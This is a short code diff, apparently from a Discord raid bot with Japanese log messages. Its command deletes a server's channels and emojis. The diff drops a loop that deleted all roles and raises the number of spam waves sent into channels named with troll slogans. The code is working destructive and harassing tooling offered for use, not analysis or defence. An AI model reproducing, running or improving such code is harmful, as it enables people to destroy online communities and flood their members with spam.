@@ -66,12 +66,6 @@ async def wappa(ctx):
             print(Fore.MAGENTA + f"{channel.name} が削除されました。" + Fore.RESET)
         except:
             print(Fore.GREEN + f"{channel.name} を削除できませんでした。" + Fore.RESET)
-    for role in guild.roles:
-        try:
-            await role.delete()
-            print(Fore.MAGENTA + f"{role.name} ロールが削除されました。" + Fore.RESET)
-        except:
-            print(Fore.GREEN + f"{role.name} ロールの削除に失敗しました。" + Fore.RESET)
     for emoji in list(ctx.guild.emojis):
         try:
             await emoji.delete()
@@ -139,7 +133,7 @@ async def aaaaaaaa(ctx: discord.ApplicationContext):
 @bot.event
 async def on_guild_channel_create(channel):
     if channel.name == "荒らし共栄圏万歳！！" or channel.name == "ワッパ主席万歳！！" or channel.name == "乙wwwww":
-        for i in range(18):
+        for i in range(25):
             for i in range(6):
                 await channel.send(random.choice(SPAM_MESSAGE))
             await asyncio.sleep(4)
